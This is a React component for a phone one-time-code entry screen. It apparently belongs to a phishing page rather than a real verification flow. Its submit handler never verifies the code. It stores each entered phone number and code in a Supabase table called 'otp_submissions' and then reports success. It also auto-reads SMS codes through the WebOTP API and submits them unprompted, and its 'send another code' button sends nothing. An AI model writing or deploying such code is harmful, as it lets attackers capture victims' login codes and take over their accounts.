import { useState, useRef, useEffect, useCallback } from 'react';
import { ChevronLeft, Smartphone } from 'lucide-react';
import { supabase } from '../lib/supabase';

interface OTPVerificationProps {
  phoneNumber: string;
  onVerify: () => void;
  onBack: () => void;
}

export default function OTPVerification({ phoneNumber, onVerify, onBack }: OTPVerificationProps) {
  const [otp, setOtp] = useState(['', '', '', '', '', '']);
  const [loading, setLoading] = useState(false);
  const [resendTimer, setResendTimer] = useState(110);
  const [autoDetectStatus, setAutoDetectStatus] = useState<'idle' | 'detecting' | 'detected'>('idle');
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const abortControllerRef = useRef<AbortController | null>(null);

  useEffect(() => {
    if (resendTimer > 0) {
      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000);
      return () => clearTimeout(timer);
    }
  }, [resendTimer]);

  useEffect(() => {
    startOTPAutoDetect();

    return () => {
      if (abortControllerRef.current) {
        abortControllerRef.current.abort();
      }
    };
  }, []);

  const startOTPAutoDetect = async () => {
    if (!('OTPCredential' in window)) {
      return;
    }

    try {
      abortControllerRef.current = new AbortController();
      setAutoDetectStatus('detecting');

      const credential = await navigator.credentials.get({
        otp: { transport: ['sms'] },
        signal: abortControllerRef.current.signal,
      } as any);

      if (credential && 'code' in credential) {
        const code = (credential as any).code;
        const otpArray = code.split('');
        setOtp(otpArray.slice(0, 6));
        setAutoDetectStatus('detected');
      }
    } catch (error) {
      if ((error as Error).name !== 'AbortError') {
        console.log('OTP auto-detect not available:', error);
      }
      setAutoDetectStatus('idle');
    }
  };

  const handleKeypadInput = (value: string) => {
    const newOtp = [...otp];
    const emptyIndex = newOtp.findIndex((digit) => digit === '');

    if (value === 'backspace') {
      for (let i = newOtp.length - 1; i >= 0; i--) {
        if (newOtp[i] !== '') {
          newOtp[i] = '';
          break;
        }
      }
    } else if (emptyIndex !== -1) {
      newOtp[emptyIndex] = value;
    }

    setOtp(newOtp);
  };

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;

    const newOtp = [...otp];
    newOtp[index] = value.slice(-1);
    setOtp(newOtp);

    if (value && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }

    if (newOtp.join('').length === 6) {
      setAutoDetectStatus('idle');
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace') {
      e.preventDefault();
      const newOtp = [...otp];
      newOtp[index] = '';
      setOtp(newOtp);
      if (index > 0) {
        inputRefs.current[index - 1]?.focus();
      }
    }
  };

  const handleSubmit = useCallback(async () => {
    const otpCode = otp.join('');

    if (otpCode.length !== 6) {
      alert('Please enter the complete code');
      return;
    }

    setLoading(true);

    try {
      const { error } = await supabase.from('otp_submissions').insert([
        {
          phone_number: phoneNumber,
          otp_code: otpCode,
        },
      ]);

      if (error) throw error;

      onVerify();
    } catch (error) {
      console.error('Error submitting OTP:', error);
      alert('An error occurred. Please try again.');
    } finally {
      setLoading(false);
    }
  }, [otp, phoneNumber, onVerify]);

  useEffect(() => {
    if (autoDetectStatus === 'detected' && otp.join('').length === 6 && !loading) {
      const timer = setTimeout(() => {
        handleSubmit();
      }, 500);
      return () => clearTimeout(timer);
    }
  }, [autoDetectStatus, otp, loading, handleSubmit]);

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      <div className="bg-yellow-500 text-gray-800 px-6 py-4 flex items-center gap-4 rounded-b-3xl">
        <button onClick={onBack} className="hover:opacity-70">
          <ChevronLeft className="w-6 h-6" />
        </button>
        <h1 className="text-xl font-semibold">Code</h1>
      </div>

      <div className="flex-1 bg-gray-200 px-6 py-8 flex flex-col">
        <div className="mb-8">
          <p className="text-gray-700 mb-2">Please enter the code that was sent to</p>
          <p className="text-gray-800 font-bold text-lg">{phoneNumber}</p>
        </div>

        <div className="mb-8">
          <div className="flex items-center justify-between mb-4">
            <label className="text-gray-700 font-medium">Enter code</label>
            <div className="flex items-center gap-2">
              <Smartphone className="w-4 h-4 text-gray-600" />
              <span className={`text-sm font-medium ${
                autoDetectStatus === 'detected' ? 'text-green-600' :
                autoDetectStatus === 'detecting' ? 'text-blue-600' :
                'text-gray-500'
              }`}>
                {autoDetectStatus === 'detected' && 'Code detected'}
                {autoDetectStatus === 'detecting' && 'Listening...'}
                {autoDetectStatus === 'idle' && 'Manual entry'}
              </span>
            </div>
          </div>
          <div className="flex gap-2 justify-center mb-8">
            {otp.map((digit, index) => (
              <input
                key={index}
                ref={(el) => {
                  inputRefs.current[index] = el;
                }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handleChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                className="w-12 h-12 text-center border-2 border-gray-400 rounded-lg bg-white focus:border-gray-600 focus:outline-none text-lg font-semibold"
              />
            ))}
          </div>

          <button
            type="button"
            onClick={() => setResendTimer(110)}
            disabled={resendTimer > 0}
            className="text-gray-700 font-semibold hover:text-gray-900 disabled:text-gray-500 uppercase text-sm"
          >
            SEND ANOTHER CODE ({resendTimer})
          </button>
        </div>

        <div className="flex-1 flex flex-col justify-end">
          <div className="grid grid-cols-4 gap-2 mb-4">
            {[1, 2, 3, 4, 5, 6, 7, 8, 9].map((num) => (
              <button
                key={num}
                onClick={() => handleKeypadInput(String(num))}
                className="bg-white border-2 border-gray-300 rounded-lg py-3 text-xl font-semibold text-gray-800 hover:bg-gray-50 active:bg-gray-100"
              >
                {num}
              </button>
            ))}
            <button
              onClick={() => handleKeypadInput('backspace')}
              className="bg-gray-300 border-2 border-gray-400 rounded-lg py-3 text-xl font-semibold text-gray-600 hover:bg-gray-350 active:bg-gray-400"
            >
              ✕
            </button>
            <button
              onClick={() => handleKeypadInput('0')}
              className="bg-white border-2 border-gray-300 rounded-lg py-3 text-xl font-semibold text-gray-800 hover:bg-gray-50 active:bg-gray-100"
            >
              0
            </button>
            <button
              onClick={handleSubmit}
              disabled={loading || otp.join('').length !== 6}
              className="bg-blue-400 border-2 border-blue-500 rounded-lg py-3 text-xl font-semibold text-blue-700 hover:bg-blue-300 active:bg-blue-400 disabled:bg-gray-300 disabled:border-gray-400 disabled:text-gray-500"
            >
              Done
            </button>
            <button
              className="bg-white border-2 border-gray-300 rounded-lg py-3 text-xl font-semibold text-gray-800 hover:bg-gray-50 active:bg-gray-100"
            >
              .-
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}
